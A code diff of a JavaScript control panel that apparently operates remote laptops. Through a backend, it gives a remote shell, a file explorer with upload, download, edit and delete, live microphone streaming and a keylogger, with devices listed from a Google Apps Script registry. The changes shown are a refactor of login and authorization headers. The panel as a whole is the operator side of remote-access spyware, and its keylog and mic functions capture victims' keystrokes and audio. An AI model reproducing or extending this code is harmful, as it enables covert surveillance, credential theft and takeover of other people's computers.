@@ -38,7 +38,11 @@ function doAuth() {
   $("authBtn").textContent = "Authenticating...";
   $("authError").textContent = "";
 
-  fetch(GAS_URL + "?action=login&username=" + encodeURIComponent(username) + "&password=" + encodeURIComponent(password))
+  fetch(GAS_URL, {
+    method: "POST",
+    headers: { "Content-Type": "application/x-www-form-urlencoded" },
+    body: "action=login&username=" + encodeURIComponent(username) + "&password=" + encodeURIComponent(password),
+  })
     .then(function(r) { return r.json(); })
     .then(function(d) {
       $("authBtn").disabled = false;
@@ -83,6 +87,26 @@ function loadDevices() {
   refreshDevices();
 }
 
+function parseDevices(rawDevices) {
+  var result = [];
+  rawDevices.forEach(function(d) {
+    if (!d.password) return;
+    result.push({
+      deviceId: d.device_id,
+      label: d.name || d.device_id,
+      _url: d.url || "",
+      _name: d.name || d.device_id,
+      _version: d.version || "?",
+      _online: false,
+      _checking: false,
+      _lastSeen: d.last_seen || "",
+      _os: d.os || "",
+      _password: d.password
+    });
+  });
+  return result;
+}
+
 function discoverDevices() {
   var list = $("deviceList");
   list.innerHTML = '<div class="empty-state">Scanning devices...</div>';
@@ -93,25 +117,11 @@ function discoverDevices() {
         list.innerHTML = '<div class="empty-state">Cannot read device registry.</div>';
         return;
       }
-      devices = [];
-      if (!data.devices.length) {
+      devices = parseDevices(data.devices);
+      if (!devices.length) {
         list.innerHTML = '<div class="empty-state">No devices registered yet.<br>Run the backend on a laptop first.</div>';
         return;
       }
-      data.devices.forEach(function(d) {
-        if (!d.password) return;
-        devices.push({
-          deviceId: d.device_id,
-          label: d.name || d.device_id,
-          _url: d.url || "",
-          _name: d.name || d.device_id,
-          _version: d.version || "?",
-          _online: false,
-          _lastSeen: d.last_seen || "",
-          _os: d.os || "",
-          _password: d.password
-        });
-      });
       renderDevices();
     })
     .catch(function() {
@@ -134,22 +144,8 @@ function refreshDevices() {
         btn.disabled = false; btn.textContent = "Refresh";
         return;
       }
-      devices = [];
-      data.devices.forEach(function(d) {
-        if (!d.password) return;
-        devices.push({
-          deviceId: d.device_id,
-          label: d.name || d.device_id,
-          _url: d.url || "",
-          _name: d.name || d.device_id,
-          _version: d.version || "?",
-          _online: false,
-          _checking: true,
-          _lastSeen: d.last_seen || "",
-          _os: d.os || "",
-          _password: d.password
-        });
-      });
+      devices = parseDevices(data.devices);
+      devices.forEach(function(d) { d._checking = true; });
       if (!devices.length) {
         list.innerHTML = '<div class="empty-state">No devices found.</div>';
         btn.disabled = false; btn.textContent = "Refresh";
@@ -349,8 +345,9 @@ function disconnect() {
 
 function api(path, opts) {
   opts = opts || {};
-  opts.headers = opts.headers || {};
-  if (conn.token) opts.headers["Authorization"] = "Bearer " + conn.token;
+  var h = opts.headers || {};
+  if (conn.token && !h["Authorization"]) h["Authorization"] = "Bearer " + conn.token;
+  opts.headers = h;
   return fetch(conn.url + path, opts).then(function(r) { return r.json(); });
 }
 
@@ -404,7 +401,7 @@ function execCmd(cmd) {
   addTyping();
   api("/api/cmd", {
     method: "POST",
-    headers: { "Content-Type": "application/json", "Authorization": "Bearer " + conn.token },
+    headers: { "Content-Type": "application/json" },
     body: JSON.stringify({ cmd: cmd }),
   })
     .then(function(d) {
@@ -444,7 +441,7 @@ function enterShell() {
   }
   api("/api/cmd", {
     method: "POST",
-    headers: { "Content-Type": "application/json", "Authorization": "Bearer " + conn.token },
+    headers: { "Content-Type": "application/json" },
     body: JSON.stringify({ cmd: "/shellcmd" }),
   }).then(function(d) {
     if (d.type === "shell") { shCwd = d.cwd || ""; shPrompt(); }
@@ -486,7 +483,7 @@ function runShell() {
 
   api("/api/cmd", {
     method: "POST",
-    headers: { "Content-Type": "application/json", "Authorization": "Bearer " + conn.token },
+    headers: { "Content-Type": "application/json" },
     body: JSON.stringify({ cmd: "/shellcmd " + cmd }),
   })
     .then(function(d) {
@@ -525,7 +522,7 @@ function openExplorer(path) {
   var cmd = path ? "/browse " + path : "/browse";
   api("/api/cmd", {
     method: "POST",
-    headers: { "Content-Type": "application/json", "Authorization": "Bearer " + conn.token },
+    headers: { "Content-Type": "application/json" },
     body: JSON.stringify({ cmd: cmd }),
   }).then(function(d) {
     if (d.type === "browse") {
@@ -541,7 +538,7 @@ function openExplorer(path) {
 function loadDrives() {
   api("/api/cmd", {
     method: "POST",
-    headers: { "Content-Type": "application/json", "Authorization": "Bearer " + conn.token },
+    headers: { "Content-Type": "application/json" },
     body: JSON.stringify({ cmd: "/drives" }),
   }).then(function(d) {
     if (d.type !== "drives") return;
@@ -593,7 +590,7 @@ function closeExplorer() { hide("explorerOverlay"); }
 function dlFile(fp, fn) {
   api("/api/cmd", {
     method: "POST",
-    headers: { "Content-Type": "application/json", "Authorization": "Bearer " + conn.token },
+    headers: { "Content-Type": "application/json" },
     body: JSON.stringify({ cmd: "/download " + fp }),
   }).then(function(d) {
     if (d.type === "file" && d.data) {
@@ -611,7 +608,7 @@ function delItem(fp, name, isDir) {
   if (!confirm("Delete " + name + "?")) return;
   api("/api/cmd", {
     method: "POST",
-    headers: { "Content-Type": "application/json", "Authorization": "Bearer " + conn.token },
+    headers: { "Content-Type": "application/json" },
     body: JSON.stringify({ cmd: "/delete " + fp }),
   }).then(function() { openExplorer(exPath); });
 }
@@ -621,7 +618,7 @@ function renItem(fp, old) {
   if (!n || n.trim() === old) return;
   api("/api/cmd", {
     method: "POST",
-    headers: { "Content-Type": "application/json", "Authorization": "Bearer " + conn.token },
+    headers: { "Content-Type": "application/json" },
     body: JSON.stringify({ cmd: "/rename " + fp + "|" + n.trim() }),
   }).then(function() { openExplorer(exPath); });
 }
@@ -630,7 +627,7 @@ function createFolder() {
   var n = prompt("Folder name:"); if (!n) return;
   api("/api/cmd", {
     method: "POST",
-    headers: { "Content-Type": "application/json", "Authorization": "Bearer " + conn.token },
+    headers: { "Content-Type": "application/json" },
     body: JSON.stringify({ cmd: "/mkdir " + exPath + "\\" + n.trim() }),
   }).then(function() { openExplorer(exPath); });
 }
@@ -639,7 +636,7 @@ function createFile() {
   var n = prompt("File name (e.g. notes.txt):"); if (!n) return;
   api("/api/cmd", {
     method: "POST",
-    headers: { "Content-Type": "application/json", "Authorization": "Bearer " + conn.token },
+    headers: { "Content-Type": "application/json" },
     body: JSON.stringify({ cmd: "/mkfile " + exPath + "\\" + n.trim() }),
   }).then(function() { openExplorer(exPath); });
 }
@@ -658,7 +655,7 @@ function handleUpload(input) {
       var b64 = reader.result.split(",")[1];
       fetch(conn.url + "/api/upload", {
         method: "POST",
-        headers: { "Content-Type": "application/json", "Authorization": "Bearer " + conn.token },
+        headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ name: file.name, path: exPath, data: b64 }),
       }).then(function() { next(); }).catch(function() { next(); });
     };
@@ -688,7 +685,7 @@ function openEditor(path) {
 
   fetch(conn.url + "/api/read-file", {
     method: "POST",
-    headers: { "Content-Type": "application/json", "Authorization": "Bearer " + conn.token },
+    headers: { "Content-Type": "application/json" },
     body: JSON.stringify({ path: path }),
   }).then(function(r) { return r.json(); })
     .then(function(d) {
@@ -714,7 +711,7 @@ function saveEditor() {
   $("edStatus").textContent = "Saving...";
   fetch(conn.url + "/api/save-file", {
     method: "POST",
-    headers: { "Content-Type": "application/json", "Authorization": "Bearer " + conn.token },
+    headers: { "Content-Type": "application/json" },
     body: JSON.stringify({ path: edState.path, content: $("edContent").value, encoding: edState.enc }),
   }).then(function(r) { return r.json(); })
     .then(function(d) {
@@ -1012,7 +1009,7 @@ function openLiveMic() { show("micOverlay"); $("micStatus").textContent = "Press
 
 function startMic() {
   $("micStatus").textContent = "Starting...";
-  api("/api/mic/start", { method: "POST", headers: { "Content-Type": "application/json", "Authorization": "Bearer " + conn.token }, body: "{}" })
+  api("/api/mic/start", { method: "POST", headers: { "Content-Type": "application/json" }, body: "{}" })
     .then(function(d) {
       if (!d.ok) { $("micStatus").textContent = d.error || "Failed"; return; }
       mic.on = true;
@@ -1043,7 +1040,7 @@ function fetchMicChunk() {
 
 function stopMic() {
   mic.on = false; if (mic.timer) { clearInterval(mic.timer); mic.timer = null; }
-  api("/api/mic/stop", { method: "POST", headers: { "Content-Type": "application/json", "Authorization": "Bearer " + conn.token }, body: "{}" }).catch(function() {});
+  api("/api/mic/stop", { method: "POST", headers: { "Content-Type": "application/json" }, body: "{}" }).catch(function() {});
   show("micStartBtn"); hide("micStopBtn"); $("micStatus").textContent = "Stopped."; $("micMeta").textContent = "Idle";
 }
 
@@ -1069,15 +1066,15 @@ function refreshKl() {
 }
 
 function startKeylog() {
-  api("/api/keylog/start", { method: "POST", headers: { "Content-Type": "application/json", "Authorization": "Bearer " + conn.token }, body: "{}" })
+  api("/api/keylog/start", { method: "POST", headers: { "Content-Type": "application/json" }, body: "{}" })
     .then(function() { refreshKl(); });
 }
 function stopKeylog() {
-  api("/api/keylog/stop", { method: "POST", headers: { "Content-Type": "application/json", "Authorization": "Bearer " + conn.token }, body: "{}" })
+  api("/api/keylog/stop", { method: "POST", headers: { "Content-Type": "application/json" }, body: "{}" })
     .then(function() { refreshKl(); });
 }
 function clearKeylog() {
-  api("/api/keylog/clear", { method: "POST", headers: { "Content-Type": "application/json", "Authorization": "Bearer " + conn.token }, body: "{}" })
+  api("/api/keylog/clear", { method: "POST", headers: { "Content-Type": "application/json" }, body: "{}" })
     .then(function() { refreshKl(); });
 }
 function copyKeylog() {
@@ -1098,7 +1095,7 @@ document.addEventListener("keydown", function(e) {
 function startHealth() {
   stopHealth();
   healthInterval = setInterval(function() {
-    fetch(conn.url + "/api/status")
+    apiRaw("/api/status")
       .then(function(r) { return r.json(); })
       .then(function() { $("panelStatus").textContent = "Connected"; $("panelStatus").className = "status-label"; })
       .catch(function() { $("panelStatus").textContent = "Offline"; $("panelStatus").className = "status-label offline"; });
